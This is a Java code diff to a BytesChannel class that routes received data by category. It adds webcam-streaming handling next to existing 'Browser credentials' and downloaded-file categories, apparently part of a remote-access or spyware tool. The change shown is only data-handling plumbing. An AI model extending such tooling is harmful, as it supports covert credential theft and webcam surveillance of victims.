@@ -13,6 +13,8 @@ public class BytesChannel {
     private ByteBuffer buffer;
     private Category category;
     private String categoryOutputFolder;
+
+    private boolean updateProgressBar = true;
     private static final int DEFAULT_BUFFER_SIZE = 1024 * 1024;
 
     public BytesChannel(byte id, Category category, UpdaterInterface updaterInterface) {
@@ -20,7 +22,7 @@ public class BytesChannel {
         this.id = id;
         this.updaterInterface = updaterInterface;
         this.buffer = ByteBuffer.allocate(DEFAULT_BUFFER_SIZE);
-        setOutputFolder(category);
+        configureCategory(category);
     }
 
     public BytesChannel(byte id, UpdaterInterface updaterInterface) {
@@ -29,7 +31,7 @@ public class BytesChannel {
         this.buffer = ByteBuffer.allocate(DEFAULT_BUFFER_SIZE);
     }
 
-    private void setOutputFolder(Category category) {
+    private void configureCategory(Category category) {
         switch (category) {
             case ZIP_FILE -> {
                 categoryOutputFolder = "Downloaded files";
@@ -42,6 +44,8 @@ public class BytesChannel {
             }
             case BROWSER_CREDENTIALS -> {
                 categoryOutputFolder = "Browser credentials";
+            } case WEBCAM_STREAMING -> {
+                updateProgressBar = false;
             }
         }
     }
@@ -67,7 +71,7 @@ public class BytesChannel {
 
     public byte[] handleMessage(byte[] buf, int offset, int length, byte control) {
         boolean isLastPacket = control == 0x02;
-        updaterInterface.processMessage(generateProgressBarJSONInformation(updaterInterface.getSystemInformation().UUID(), id, length - offset, isLastPacket).toString());
+        if (updateProgressBar) updaterInterface.processMessage(generateProgressBarJSONInformation(updaterInterface.getSystemInformation().UUID(), id, length - offset, isLastPacket).toString());
         write(buf, offset + 2, length - 2);
         if (isLastPacket) {
             return flipAndGet();
